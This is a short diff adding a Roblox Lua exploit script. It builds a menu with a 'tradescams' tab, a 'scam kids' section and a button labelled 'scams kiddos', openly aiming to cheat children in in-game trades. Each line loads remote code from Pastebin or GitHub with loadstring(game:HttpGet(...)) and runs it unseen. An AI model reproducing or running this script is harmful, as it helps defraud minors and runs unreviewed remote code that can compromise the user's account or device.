@@ -1,0 +1,2 @@
+local Library = loadstring(game:HttpGet("https://pastebin.com/raw/vff1bQ9F"))() local Window = Library.CreateLib("BaconBoyYT", "Midnight") local Tab = Window:NewTab("tradescams") local Section = Tab:NewSection("scam kids") Section:NewButton("tradescam🙈", "scams kiddos", function() _G.Key = "freevcaccforyou"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KIDINApsx/versions/main/v1.lua"))() print("Clicked") end)
